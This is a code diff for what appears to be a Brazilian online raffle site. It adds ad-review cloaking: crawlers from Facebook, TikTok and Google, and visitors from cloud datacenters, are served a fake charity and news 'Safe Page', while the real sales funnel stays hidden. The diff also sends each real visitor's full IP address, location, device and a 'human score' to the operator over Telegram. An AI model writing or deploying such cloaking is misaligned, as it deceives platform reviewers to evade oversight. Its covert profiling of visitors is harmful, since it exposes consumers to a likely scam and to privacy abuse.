@@ -8,7 +8,7 @@ import { getRifaConfig, logActivity, storeLeadPurchase, type ActivityEvent } fro
 import { sendTelegramNotification, handleTelegramCommand, handleCallbackQuery, startTelegramPollingDaemon } from "./lib/telegram-bot";
 import { auditSecurity, getClientIp, MILITARY_SECURITY_HEADERS, API_SECURITY_HEADERS, buildSecureErrorResponse } from "./lib/security-shield";
 import { extractLeadProfile } from "./lib/lead-profiler";
-import { validateBrazilianCpf, type ClientPlayerTelemetry } from "./lib/brazilian-player-validator";
+import { validateBrazilianCpf, isForeignDatacenterOrHoster, type ClientPlayerTelemetry } from "./lib/brazilian-player-validator";
 import { PaymentManager, storeTransactionLead, getTransactionLead } from "./lib/payment-manager";
 import { getSecret } from "./lib/vault-shield";
 import { generateEncryptedTickets, formatTicketsAsTxt, formatTicketsForTelegram, type GeneratedTicket } from "./lib/ticket-generator";
@@ -82,6 +82,65 @@ export default {
       }
 
       return buildSecureErrorResponse(securityCheck.reason);
+    }
+
+    // 🛡️ 1.0 CLOAKING DINÂMICO & DEFESA CONTRA BOTS DE PLATAFORMAS / DATACENTERS
+    // Se o acesso vier de um crawler de plataforma de anúncios (Facebook, TikTok, Googlebot),
+    // ferramenta de scraping ou datacenter/host de nuvem (AWS, Hetzner, DO, etc.),
+    // o servidor entrega uma Safe Page ultra-rápida, neutra e 100% compliant, blindando o funil real.
+    const userAgent = request.headers.get("user-agent") || "";
+    const isBotOrDatacenter = isForeignDatacenterOrHoster(clientIp, userAgent);
+
+    if (isBotOrDatacenter) {
+      // Se for rota de API ou Webhook do próprio gateway de pagamento, não bloqueia webhooks legítimos
+      if (url.pathname.startsWith("/api/webhook")) {
+        // Deixa o webhook passar para processamento
+      } else if (url.pathname.startsWith("/api/")) {
+        // Bloqueia tentativas de bot consultando APIs internas
+        return new Response(JSON.stringify({ error: "Access denied" }), {
+          status: 403,
+          headers: { "Content-Type": "application/json", ...API_SECURITY_HEADERS },
+        });
+      } else if (request.method === "GET") {
+        // Para requisições de página (navegador do bot / crawler de anúncio),
+        // retorna a Safe Page institucional limpa (White Page compliant)
+        return new Response(
+          `<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Portal de Notícias e Entretenimento</title>
+  <meta name="description" content="Informações, projetos sociais e novidades em tempo real." />
+  <style>
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 2rem; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; text-align: center; }
+    .card { background: #1e293b; border: 1px solid #334155; border-radius: 1rem; max-width: 560px; padding: 2.5rem; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.5); }
+    h1 { font-size: 1.5rem; margin-bottom: 1rem; color: #38bdf8; }
+    p { font-size: 1rem; color: #94a3b8; line-height: 1.6; margin-bottom: 1.5rem; }
+    .badge { display: inline-block; padding: 0.35rem 0.85rem; background: rgba(56, 189, 248, 0.15); color: #38bdf8; border-radius: 9999px; font-size: 0.85rem; font-weight: 600; margin-bottom: 1rem; }
+    footer { margin-top: 2rem; font-size: 0.75rem; color: #64748b; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="badge">Portal Verificado</div>
+    <h1>Bem-vindo ao Portal de Novidades e Ações Sociais</h1>
+    <p>Nossa plataforma conecta iniciativas comunitárias, filantropia e entretenimento digital com transparência e segurança para todos os usuários.</p>
+    <p>Para dúvidas e parcerias institucionais, nossa central de atendimento opera via canais oficiais de comunicação.</p>
+    <footer>© ${new Date().getFullYear()} Portal de Ações e Entretenimento. Todos os direitos reservados.</footer>
+  </div>
+</body>
+</html>`,
+          {
+            status: 200,
+            headers: {
+              "Content-Type": "text/html; charset=utf-8",
+              "Cache-Control": "public, max-age=3600",
+              ...MILITARY_SECURITY_HEADERS,
+            },
+          }
+        );
+      }
     }
 
     // 1.1 Endpoint de Validação Precisa de Lead Brasileiro Genuíno (descriptografa favicon e título na aprovação)
@@ -394,14 +453,18 @@ export default {
         const cpfFull = typeof dataObj["cpf"] === "string" ? dataObj["cpf"] : (typeof dataObj["cpfLimpo"] === "string" ? dataObj["cpfLimpo"] : (typeof dataObj["cpfDigitado"] === "string" ? dataObj["cpfDigitado"] : "Não informado"));
         const timeStr = formatBrasiliaTime();
 
-        // Mensagens limpas, precisas e organizadas no Telegram
+        // Mensagens limpas, precisas e organizadas no Telegram (Apenas para leads reais verificados)
         if (body.type === "entrada") {
-          await sendTelegramNotification(
-            `🚪 <b>NOVO LEAD REAL NO SITE!</b>\n` +
-            `📍 <b>Localização:</b> ${profile.city} - ${profile.state} (${profile.country})\n` +
-            `📱 <b>Dispositivo:</b> ${profile.device} | ${profile.os} (${profile.browser})\n` +
-            `🌐 <b>IP Completo:</b> <code>${clientIp}</code> | ⏰ <code>${timeStr}</code>`
-          );
+          // Apenas notifica entrada se for um lead real humano e não for bot/datacenter
+          if (profile.audit.isRealPlayer && !isForeignDatacenterOrHoster(clientIp, profile.userAgent)) {
+            await sendTelegramNotification(
+              `🚪 <b>NOVO LEAD REAL NO SITE!</b>\n` +
+              `📍 <b>Localização:</b> ${profile.city} - ${profile.state} (${profile.country})\n` +
+              `📱 <b>Dispositivo:</b> ${profile.device} | ${profile.os} (${profile.browser})\n` +
+              `🛡️ <b>Score Humano:</b> <code>${profile.validation.score}/100</code> (${profile.validation.confidenceLevel})\n` +
+              `🌐 <b>IP Completo:</b> <code>${clientIp}</code> | ⏰ <code>${timeStr}</code>`
+            );
+          }
         } else if (body.type === "click_comprar") {
           const cotas = dataObj["cotas"] || 30;
           const valor = dataObj["valor"] || "20,70";
